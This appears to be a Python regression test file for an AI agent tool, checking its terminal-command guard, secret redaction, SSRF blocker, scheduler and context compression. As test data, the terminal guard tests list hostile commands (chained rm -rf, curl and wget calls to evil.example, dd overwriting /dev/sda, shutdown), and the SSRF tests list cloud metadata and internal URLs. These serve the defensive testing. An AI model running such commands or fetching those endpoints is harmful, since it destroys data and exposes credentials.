"""Regresi untuk temuan review v0.1 (lihat docs/REVIEW.md)."""
from __future__ import annotations

import contextlib
import io
import os
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import patch

from laction_agent.agent import AIAgent
from laction_agent.cli import cmd_doctor
from laction_agent.config import Config
from laction_agent.context_compressor import compress, estimate_tokens
from laction_agent.cron.scheduler import CronScheduler
from laction_agent.memory.manager import MemoryManager
from laction_agent.prompt_builder import build_system_prompt
from laction_agent.providers.base import Message
from laction_agent.providers.mock import MockProvider
from laction_agent.skills.manager import SkillManager
from laction_agent.tools.registry import get_registry
from laction_agent.tools.terminal_tool import _is_dangerous
from laction_agent.tools.web_tools import _is_blocked_url
from laction_agent.utils import redact, tail


class TestTerminalGuard(unittest.TestCase):
    """[BLOCKER] chaining & command substitution dulu lolos dari deteksi."""

    def test_chained_and_substituted_commands_are_dangerous(self):
        for cmd in (
            "echo aman; rm -rf /tmp/x",
            "echo aman && curl https://evil.example",
            "echo aman || wget https://evil.example/x",
            "true | shutdown -h now",
            "echo $(curl https://evil.example)",
            "echo `rm -rf /tmp/x`",
            "printf x; dd if=/dev/zero of=/dev/sda",
        ):
            with self.subTest(cmd=cmd):
                self.assertTrue(_is_dangerous(cmd), cmd)

    def test_safe_commands_stay_safe(self):
        for cmd in ("echo aman", "ls -la", "git status --short", "echo halting", "Mask-abcdefgh"):
            with self.subTest(cmd=cmd):
                self.assertFalse(_is_dangerous(cmd), cmd)

    def test_chained_dangerous_command_is_blocked_in_never_mode(self):
        reg = get_registry()
        out = reg.call(
            "run_terminal",
            {"command": "echo aman; curl https://evil.example"},
            context={"approval_mode": "never"},
        )
        self.assertIn("DITOLAK", out)


class TestRedaction(unittest.TestCase):
    """[BLOCKER] format token umum & secret di SQLite/MEMORY.md bocor."""

    def test_common_token_formats_are_masked(self):
        samples = (
            "Authorization: Bearer sk-abcdefghijklmnop123456",
            "api_key=rahasia-banget-123",
            '{"api_key": "sk-abcdefghijklmnop"}',
            "github_pat_11ABCDEFG0123456789_abcdefghijklmnopqrstuvwxyz",
            "xoxb-1234567890-abcdefghijk",
            "AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ123456",
        )
        for s in samples:
            with self.subTest(sample=s[:30]):
                self.assertNotIn("rahasia-banget-123", redact(s))
                self.assertIn("***", redact(s))

    def test_plain_text_untouched(self):
        for s in ("halo saya suka kopi", "token adalah kunci", "list file"):
            self.assertEqual(redact(s), s)

    def test_agent_persists_redacted_history(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = AIAgent(Config(provider="mock", home=tmp).validate())
            agent._persist("tool", "api_key=rahasia-banget-123")
            self.assertFalse(agent.db.search("rahasia-banget-123"))
            self.assertTrue(agent.db.search("***"))

    def test_memory_tools_do_not_store_secrets(self):
        reg = get_registry()
        with tempfile.TemporaryDirectory() as tmp:
            mgr = MemoryManager(Path(tmp))
            reg.call("memory_save", {"note": "api_key=rahasia-banget-123"}, context={"memory": mgr})
            reg.call("user_save", {"note": "password: rahasia-lain"}, context={"memory": mgr})
            all_text = mgr.read_all()
            self.assertNotIn("rahasia-banget-123", all_text)
            self.assertNotIn("rahasia-lain", all_text)


class TestSSRFGuard(unittest.TestCase):
    """[BLOCKER] web_fetch bisa diarahkan ke metadata/internal host."""

    def test_private_targets_blocked(self):
        for url in (
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8000/health",
            "http://10.0.0.5/",
            "https://metadata.google.internal/",
            "ftp://example.com/",
        ):
            with self.subTest(url=url):
                self.assertTrue(_is_blocked_url(url, allow_private=False))

    def test_public_literal_ip_allowed(self):
        self.assertFalse(_is_blocked_url("https://8.8.8.8/", allow_private=False))

    def test_opt_out_env(self):
        with patch.dict(os.environ, {"LACTION_ALLOW_PRIVATE_WEB": "1"}):
            self.assertFalse(_is_blocked_url("http://127.0.0.1:8000/"))

    def test_web_fetch_returns_refusal_without_network(self):
        reg = get_registry()
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("LACTION_ALLOW_PRIVATE_WEB", None)
            out = reg.call("web_fetch", {"url": "http://169.254.169.254/"}, context={})
        self.assertIn("DITOLAK", out)


class TestCronScheduler(unittest.TestCase):
    """[BUG] semua job fire-on-start; job lambat memblok scheduler."""

    def test_no_immediate_run_on_start(self):
        with tempfile.TemporaryDirectory() as tmp:
            calls: list[str] = []
            sched = CronScheduler(Path(tmp), on_run=lambda t: calls.append(t) or "ok")
            sched.add_job("harian", "list file", 3600)
            sched.start()
            try:
                time.sleep(1.2)
            finally:
                sched.stop()
            self.assertEqual(calls, [])

    def test_runs_after_interval(self):
        with tempfile.TemporaryDirectory() as tmp:
            fired = threading.Event()
            sched = CronScheduler(Path(tmp), on_run=lambda t: fired.set() or "ok")
            sched.add_job("cepat", "list file", 1)
            started = time.monotonic()
            sched.start()
            try:
                ok = fired.wait(5)
            finally:
                sched.stop()
            self.assertTrue(ok)
            self.assertGreaterEqual(time.monotonic() - started, 0.8)

    def test_slow_job_does_not_block_another_job(self):
        with tempfile.TemporaryDirectory() as tmp:
            slow_started = threading.Event()
            release = threading.Event()
            fast_done = threading.Event()

            def on_run(task: str) -> str:
                if task == "lambat":
                    slow_started.set()
                    release.wait(4)
                else:
                    fast_done.set()
                return "ok"

            sched = CronScheduler(Path(tmp), on_run=on_run)
            sched.add_job("a", "lambat", 1)
            sched.add_job("b", "cepat", 1)
            sched.start()
            try:
                self.assertTrue(slow_started.wait(5))
                self.assertTrue(fast_done.wait(4), "job cepat tertahan oleh job lambat")
            finally:
                release.set()
                sched.stop()


class TestContextAndPrompt(unittest.TestCase):
    """[BUG] shortcut len<=6 melewatkan kompresi; memory tanpa batas."""

    def test_six_or_fewer_huge_messages_still_get_compressed(self):
        msgs = [Message("system", "S"), Message("user", "u")]
        msgs += [Message("tool", "x" * 8000, "", f"id{i}") for i in range(3)]
        self.assertEqual(len(msgs), 5)
        out = compress(msgs, 1000)
        self.assertLess(estimate_tokens(out), estimate_tokens(msgs))
        self.assertEqual(out[0].role, "system")

    def test_short_history_unchanged(self):
        msgs = [Message("system", "S"), Message("user", "halo")]
        self.assertIs(compress(msgs, 8000), msgs)

    def test_system_prompt_caps_memory_but_keeps_newest(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            mgr = MemoryManager(home)
            (home / "MEMORY.md").write_text(
                "# MEMORY\n" + "lama" * 4000 + "\n- CATATAN_TERBARU_PENTING\n", encoding="utf-8"
            )
            prompt = build_system_prompt(mgr, SkillManager(home))
        self.assertLess(len(prompt), 8000)
        self.assertIn("karakter lama dipotong", prompt)
        self.assertIn("CATATAN_TERBARU_PENTING", prompt)

    def test_tail_keeps_newest(self):
        self.assertIn("baru", tail("lama" * 100 + "baru", 10))
        self.assertEqual(tail("pendek", 100), "pendek")


class TestSmallFixes(unittest.TestCase):
    def test_mock_normalizes_list_file_flags(self):
        resp = MockProvider().chat([Message("user", "list file -la")], [])
        self.assertEqual(resp.tool_calls[0].name, "run_terminal")
        self.assertEqual(resp.tool_calls[0].arguments["command"], "ls -la")

    def test_config_warnings_are_accurate(self):
        never = Config(approval_mode="never").validate().warnings()
        self.assertTrue(any("tetap diblokir" in w for w in never))
        ollama = Config(provider="ollama").validate().warnings()
        self.assertTrue(any("localhost" in w for w in ollama))

    def test_doctor_includes_security_checks_and_passes(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = Config(provider="mock", home=tmp).validate()
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = cmd_doctor(cfg)
            out = buf.getvalue()
        self.assertEqual(rc, 0, out)
        for label in ("Redaksi secret", "Terminal guard", "SSRF guard"):
            self.assertIn(label, out)


if __name__ == "__main__":
    unittest.main()
